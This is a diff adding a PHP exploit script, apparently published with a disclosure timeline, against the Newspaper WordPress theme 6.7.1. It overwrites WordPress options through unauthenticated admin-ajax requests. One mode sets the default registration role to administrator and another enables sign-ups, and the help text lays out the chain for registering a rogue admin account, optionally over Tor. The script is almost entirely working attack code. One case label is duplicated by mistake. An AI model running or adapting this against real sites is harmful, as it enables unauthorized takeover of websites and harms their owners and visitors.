@@ -1,0 +1,125 @@
+<?php
+/**
+ * Exploit Title: Newspaper WP Theme Expoit
+ * Google Dork:
+ * Exploit Author: wp0Day.com <contact@wp0day.com>
+ * Vendor Homepage: http://tagdiv.com/newspaper/
+ * Software Link: http://themeforest.net/item/newspaper/5489609
+ * Version: 6.7.1
+ * Tested on: Debian 8, PHP 5.6.17-3
+ * Type: WP Options Overwrite, Possible more
+ * Time line: Found [23-APR-2016], Vendor notified [23-APR-2016], Vendor fixed: [27-APR-2016], [RD:1]
+ */
+
+
+require_once('curl.php');
+//OR
+//include('https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php');
+$curl = new CurlWrapper();
+
+
+$options = getopt("t:m:u:p:f:c:",array('tor:'));
+print_r($options);
+$options = validateInput($options);
+
+if (!$options){
+    showHelp();
+}
+
+if ($options['tor'] === true)
+{
+    echo " ### USING TOR ###\n";
+    echo "Setting TOR Proxy...\n";
+    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
+    $curl->addOption(CURLOPT_PROXYTYPE,7);
+    echo "Checking IPv4 Address\n";
+    $curl->get('https://dynamicdns.park-your-domain.com/getip');
+    echo "Got IP : ".$curl->getResponse()."\n";
+    echo "Are you sure you want to do this?\nType 'wololo' to continue: ";
+    $answer = fgets(fopen ("php://stdin","r"));
+    if(trim($answer) != 'wololo'){
+        die("Aborting!\n");
+    }
+    echo "OK...\n";
+}
+
+function exploit(){
+    global $curl, $options;
+    switch ($options['m']){
+        case "admin_on":
+              echo "Setting default role to Administrator \n";
+              $data = array('action'=>'td_ajax_update_panel', 'wp_option[default_role]'=>'administrator');
+        break;
+        case "admin_off":
+              echo "Setting default role to Subscriber \n";
+              $data = array('action'=>'td_ajax_update_panel', 'wp_option[default_role]'=>'subscriber');
+        break;
+        case "reg_on":
+            echo "Enabling registrations\n";
+            $data = array('action'=>'td_ajax_update_panel', 'wp_option[users_can_register]'=>'1');
+        break;
+        case "reg_on":
+            echo "Disabling registrations\n";
+            $data = array('action'=>'td_ajax_update_panel', 'wp_option[users_can_register]'=>'0');
+        break;
+
+    }
+
+    $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
+    $resp = $curl->getResponse();
+    echo "Response: ". $resp."\n";
+}
+
+
+exploit();
+
+
+
+function validateInput($options){
+
+    if ( !isset($options['t']) || !filter_var($options['t'], FILTER_VALIDATE_URL) ){
+        return false;
+    }
+
+    if (!preg_match('~/$~',$options['t'])){
+        $options['t'] = $options['t'].'/';
+    }
+    if (!isset($options['m']) || !in_array($options['m'], array('admin_on','reg_on','admin_off','reg_off') ) ){
+        return false;
+    }
+
+    $options['tor'] = isset($options['tor']);
+
+    return $options;
+}
+
+
+function showHelp(){
+    global $argv;
+    $help = <<<EOD
+
+    Newspaper WP Theme Exploit
+
+Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -m [MODE]
+
+       [TARGET_URL] http://localhost/wordpress/
+       [MODE] admin_on - Default admin level on reg. admin_off - Default subscriber on reg.
+              reg_on - Turns on user registration. reg_off - Turns off user registrations.
+
+       Trun on registrations, set default level to admin, register a user on the webiste,
+       turn off admin mode, turn off user registrations.
+
+Examples:
+       php $argv[0] -t http://localhost/wordpress --tor=yes -m admin_on
+       [Register a new user as Admin]
+       php $argv[0] -t http://localhost/wordpress --tor=yes -m admin_off
+
+    Misc:
+           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
+           @link http://github.com/svyatov/CurlWrapper
+           @license http://www.opensource.org/licenses/mit-license.html MIT License
+
+EOD;
+    echo $help."\n\n";
+    die();
+}
